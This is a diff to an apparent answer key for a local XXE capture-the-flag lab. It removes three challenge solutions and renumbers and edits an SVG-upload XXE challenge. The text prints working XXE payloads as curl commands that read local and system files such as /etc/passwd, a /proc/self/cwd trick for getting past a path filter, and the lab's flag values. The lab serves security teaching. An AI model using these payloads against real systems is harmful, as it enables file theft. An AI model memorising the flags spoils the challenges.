@@ -20,90 +20,7 @@ Flag: FLAG{xx3_f1l3_r34d}
 
 -------------------------------------------------------------------------------
 
-CHALLENGE 2: Blind XXE — Error-Based Exfiltration
-Flag: FLAG{xx3_bl1nd_00b}
-
-  The /import endpoint parses XML but does NOT display entity content
-  in the response (only shows tag name and child count). However,
-  error messages may leak entity content (error-based blind XXE).
-
-  Approach 1: Use entity in an invalid context to trigger an error
-  that includes the entity value in the error message:
-
-  curl -X POST http://localhost:5012/import \
-    -H "Content-Type: application/xml" \
-    -d '<?xml version="1.0"?>
-  <!DOCTYPE foo [
-    <!ENTITY xxe SYSTEM "file:///app/flag2.txt">
-  ]>
-  <root><invalid>&xxe;</invalid></root>'
-
-  If the entity content appears in validation errors, you get the flag.
-
-  Approach 2: Read the file via ch1's /parse endpoint instead (which
-  reflects content directly):
-
-  curl -X POST http://localhost:5012/parse \
-    -H "Content-Type: application/xml" \
-    -d '<?xml version="1.0"?>
-  <!DOCTYPE foo [
-    <!ENTITY xxe SYSTEM "file:///app/flag2.txt">
-  ]>
-  <data>&xxe;</data>'
-
-  NOTE: Modern lxml/libxml2 does not make HTTP requests for entity
-  resolution, so OOB (out-of-band) exfiltration via HTTP is not
-  possible in this lab. The error-based technique works with file://.
-
--------------------------------------------------------------------------------
-
-CHALLENGE 3: XXE File Read — Different Path
-Flag: FLAG{xx3_ssrf_ch41n}
-
-  The /validate endpoint has the same vulnerable parser. The flag is
-  in a different file path (/app/flag3.txt) than ch1 (/app/flag.txt).
-  You need to discover the right file to read.
-
-  curl -X POST http://localhost:5012/validate \
-    -H "Content-Type: application/xml" \
-    -d '<?xml version="1.0"?>
-  <!DOCTYPE foo [
-    <!ENTITY xxe SYSTEM "file:///app/flag3.txt">
-  ]>
-  <data>&xxe;</data>'
-
-  Hint: Try reading /etc/passwd first to confirm file:// works,
-  then enumerate files in /app/ to find flag files.
-
--------------------------------------------------------------------------------
-
-CHALLENGE 4: Filter Bypass — Path Restriction Evasion
-Flag: FLAG{xx3_f1lt3r_byp4ss}
-
-  The /parse-filtered endpoint blocks "/app/" paths and "../"
-  traversal sequences in the raw XML text. The flag is in
-  /app/flag4.txt but you can't reference /app/ directly.
-
-  Bypass: Use /proc/self/cwd/ which is a Linux symlink pointing
-  to the process's working directory (/app), avoiding "/app/" :
-
-  curl -X POST http://localhost:5012/parse-filtered \
-    -H "Content-Type: application/xml" \
-    -d '<?xml version="1.0"?>
-  <!DOCTYPE foo [
-    <!ENTITY xxe SYSTEM "file:///proc/self/cwd/flag4.txt">
-  ]>
-  <root>&xxe;</root>'
-
-  The filter sees "/proc/self/cwd/flag4.txt" which doesn't contain
-  "/app/" — but /proc/self/cwd is a symlink to /app, so the file
-  is successfully read.
-
-  Alternative: /proc/1/cwd/flag4.txt (PID 1's cwd = /app in Docker).
-
--------------------------------------------------------------------------------
-
-CHALLENGE 5: SVG Upload XXE
+CHALLENGE 2: SVG Upload XXE
 Flag: FLAG{xx3_svg_1nj3ct}
 
   The /svg-upload endpoint accepts SVG file uploads and parses them
@@ -114,7 +31,7 @@ Flag: FLAG{xx3_svg_1nj3ct}
   cat > /tmp/evil.svg << 'EOF'
   <?xml version="1.0"?>
   <!DOCTYPE svg [
-    <!ENTITY xxe SYSTEM "file:///app/flag5.txt">
+    <!ENTITY xxe SYSTEM "file:///app/flag2.txt">
   ]>
   <svg xmlns="http://www.w3.org/2000/svg">
     <text x="10" y="20">&xxe;</text>
@@ -122,7 +39,7 @@ Flag: FLAG{xx3_svg_1nj3ct}
   EOF
 
   Upload it:
-  curl -F "file=@/tmp/evil.svg" http://localhost:5012/svg-upload
+  curl -F "svg=@/tmp/evil.svg" http://localhost:5012/svg-upload
 
   The parsed text content includes the flag from the entity expansion.
 
